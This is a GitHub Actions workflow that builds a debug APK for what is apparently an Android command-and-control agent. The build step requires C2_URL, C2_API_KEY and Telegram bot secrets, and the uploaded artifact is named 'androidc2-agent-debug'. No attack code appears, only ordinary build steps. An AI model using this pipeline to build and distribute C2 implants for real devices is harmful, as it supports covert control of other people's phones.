name: Build Android APK

on:
  push:
    branches: [ main ]
    paths:
      - 'agent_android/**'
      - '.github/workflows/build-apk.yml'
  workflow_dispatch:

jobs:
  build:
    name: Build debug APK
    runs-on: ubuntu-latest
    timeout-minutes: 30

    defaults:
      run:
        working-directory: agent_android

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      # Installs a Gradle distribution and puts `gradle` on PATH. It does NOT
      # create ./gradlew for us — see the next step.
      - name: Set up Gradle
        uses: gradle/actions/setup-gradle@v4

      # gradlew / gradlew.bat / gradle-wrapper.jar are binaries and are not
      # committed, so they get generated here.
      #
      # Generated in a throwaway project rather than in agent_android so this
      # step never has to configure the Android build: no SDK lookup, no AGP
      # resolution, no chance of the wrapper task failing for unrelated
      # reasons. Only the three wrapper files are copied back.
      - name: Generate Gradle wrapper
        env:
          GRADLE_VERSION: '8.4'
          GRADLE_SHA256: '3e1af3ae886920c3ac87f7a91f816c0c7c436f276a6eefdb3da152100fef72ae'
        run: |
          set -euo pipefail
          seed="$(mktemp -d)"
          printf 'rootProject.name = "wrapper-seed"\n' > "$seed/settings.gradle"

          (
            cd "$seed"
            gradle wrapper \
              --gradle-version "$GRADLE_VERSION" \
              --distribution-type bin \
              --no-daemon --quiet
          )

          target="$GITHUB_WORKSPACE/agent_android"
          cp "$seed/gradlew" "$seed/gradlew.bat" "$target/"
          mkdir -p "$target/gradle/wrapper"
          cp "$seed/gradle/wrapper/gradle-wrapper.jar" \
             "$target/gradle/wrapper/"

          # Pin the distribution checksum ourselves rather than via a CLI
          # flag, so this keeps working regardless of which wrapper options
          # the installed Gradle happens to accept. The wrapper verifies this
          # on every distribution download.
          props="$target/gradle/wrapper/gradle-wrapper.properties"
          grep -v '^distributionSha256Sum=' "$seed/gradle/wrapper/gradle-wrapper.properties" \
            > "$props"
          echo "distributionSha256Sum=$GRADLE_SHA256" >> "$props"

          chmod +x "$target/gradlew"

          echo "::group::wrapper contents"
          ls -l "$target/gradlew" "$target/gradle/wrapper/"
          cat "$props"
          echo "::endgroup::"

      - name: Verify wrapper was generated
        run: |
          set -euo pipefail
          test -x ./gradlew
          test -f ./gradle/wrapper/gradle-wrapper.jar
          ./gradlew --version | head -5

      - name: Configure Android SDK
        run: |
          echo "ANDROID_HOME=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
          echo "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin" >> $GITHUB_PATH
          echo "$ANDROID_SDK_ROOT/platform-tools" >> $GITHUB_PATH
          yes | "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager" --licenses > /dev/null 2>&1 || true
          "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager" --install "platforms;android-34" "build-tools;34.0.0" > /dev/null

      - name: Write local.properties
        run: echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties

      # build.gradle throws on any missing value, so this fails the job
      # instead of quietly baking "placeholder" into the APK.
      - name: Verify build secrets are present
        env:
          TG_BOT_TOKEN: ${{ secrets.TG_BOT_TOKEN }}
          TG_CHAT_ID:   ${{ secrets.TG_CHAT_ID }}
          C2_API_KEY:   ${{ secrets.C2_API_KEY }}
          C2_URL:       ${{ secrets.C2_URL }}
        run: |
          missing=0
          for name in TG_BOT_TOKEN TG_CHAT_ID C2_API_KEY C2_URL; do
            if [ -z "${!name}" ]; then echo "::error::secret $name is not set"; missing=1; fi
          done
          [ "$missing" -eq 0 ]

      - name: Build debug APK
        run: ./gradlew assembleDebug --no-daemon --stacktrace

      - name: Upload debug APK
        uses: actions/upload-artifact@v4
        with:
          name: androidc2-agent-debug
          path: agent_android/app/build/outputs/apk/debug/*.apk
          if-no-files-found: error
          retention-days: 30
